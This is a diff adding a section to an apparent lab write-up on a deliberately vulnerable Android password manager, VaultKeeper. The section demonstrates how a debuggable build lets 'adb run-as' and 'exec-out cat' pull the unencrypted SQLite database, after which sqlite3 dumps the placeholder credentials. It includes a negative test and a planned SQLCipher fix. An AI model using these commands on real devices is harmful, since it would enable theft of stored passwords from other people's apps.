@@ -496,3 +496,81 @@ Still returns the real 67-byte placeholder PNG unchanged — the fix rejects tra
 ### v0.5 closed
 
 Vuln #2 is fixed and verified with a real negative test (both v0.4 payloads now throw, including the cross-UID one that the OS sandbox already blocked on its own) and a real positive test (the intended favicon read still works). Both vulns demonstrated so far (#1 SQL injection, #2 path traversal) are now fixed; vuln #3 (unencrypted local database, readable via `adb shell run-as` on a debuggable build) remains open — exploited next in v0.6.
+
+## v0.6 — Exploiting the unencrypted database (vuln #3)
+
+Unlike vulns #1 and #2, this one isn't a bug in `VaultContentProvider` at all — the provider is now fully fixed (v0.3 + v0.5). It's a property of the data store itself: Room/SQLite writes the `credentials` table to disk as plain, unencrypted pages, and `vaultkeeper/build.gradle.kts`'s `debug` build type sets `isDebuggable = true`:
+
+```kotlin
+buildTypes {
+    debug {
+        isDebuggable = true
+        signingConfig = signingConfigs.getByName("debug")
+    }
+    ...
+}
+```
+
+That flag — baked into the installed APK's manifest, not a system setting — is exactly what `adb shell run-as` checks before granting shell a given app's own UID for filesystem access. No `ContentProvider`, no IPC, no SQL at all: just a direct read of the app's private data directory.
+
+### Attack — pulling the raw database via `adb shell run-as`
+
+`VaultKeeper` is still at its current, fully-patched state (`main`, v0.5 fix in place) — this attack doesn't touch the provider, so no rebuild/reinstall was needed.
+
+```
+$ adb shell run-as dev.guillermomartin.vaultkeeper id
+uid=10235(u0_a235) gid=10235(u0_a235) ... context=u:r:runas_app:s0:c235,c256,c512,c768
+
+$ adb shell run-as dev.guillermomartin.vaultkeeper ls -la databases/
+-rw-rw---- 1 u0_a235 u0_a235  4096 ... vault.db
+-rw------- 1 u0_a235 u0_a235 32768 ... vault.db-shm
+-rw------- 1 u0_a235 u0_a235 45352 ... vault.db-wal
+```
+
+Pulled all three files with `adb exec-out` (not `adb shell ... > file`, which allocates a PTY that can mangle binary data with CRLF translation):
+
+```
+$ adb exec-out run-as dev.guillermomartin.vaultkeeper cat databases/vault.db > vault.db
+$ adb exec-out run-as dev.guillermomartin.vaultkeeper cat databases/vault.db-wal > vault.db-wal
+$ adb exec-out run-as dev.guillermomartin.vaultkeeper cat databases/vault.db-shm > vault.db-shm
+$ file vault.db vault.db-wal vault.db-shm
+vault.db:     SQLite 3.x database, ...
+vault.db-wal: SQLite Write-Ahead Log, version 3007000
+vault.db-shm: data
+```
+
+With all three files together (`sqlite3` auto-detects and replays the `-wal` next to its main `.db`), the leak is a clean structured query — not just a `strings` grep like v0.4's:
+
+```
+$ sqlite3 vault.db ".tables"
+android_metadata   credentials        room_master_table
+
+$ sqlite3 vault.db "SELECT * FROM credentials;"
+1|example.test|demo@example.test|Tr0ub4dor&3-fake
+2|mail.example|demo.mail@example.test|Hunter2-fake
+3|shop.example|demo.shop@example.test|Cassette-Battery-Staple-fake
+```
+
+Full plaintext credential dump, entirely bypassing both of VaultKeeper's already-fixed provider vulnerabilities — this vector never goes through `VaultContentProvider` at all.
+
+### Boundary check — is this the emulator being permissive, or the app's own flag?
+
+```
+$ adb shell getprop ro.debuggable
+0
+$ adb shell getprop ro.build.type
+user
+```
+
+The emulator's system image itself is a `user` build (`ro.debuggable=0`) — not the permissive `userdebug`/`eng` image that would grant `run-as` for *any* installed app regardless of its own manifest. Confirmed the gate is really per-app by testing a genuinely non-debuggable app on the same device:
+
+```
+$ adb shell run-as com.android.chrome id
+run-as: package not debuggable: com.android.chrome
+```
+
+versus `VaultKeeper` (`isDebuggable = true` in its `debug` build type) succeeding above. This isolates the root cause precisely: it's `VaultKeeper`'s own debug build flag — not the emulator, not a rooted/permissive device — that hands an attacker with adb access (e.g. a lost/stolen device with USB debugging left on, or a QA/debug build that leaked) a direct, code-free path to the entire plaintext database.
+
+### v0.6 closed
+
+Vuln #3 is proven with a full plaintext dump of the `credentials` table pulled straight off disk via `adb shell run-as`, independent of both already-fixed provider vulnerabilities, and scoped with a real negative test showing the same command is refused outright against a non-debuggable app on the same device. v0.7 fixes this by encrypting the database at rest with SQLCipher, keyed from an Android Keystore-backed passphrase.
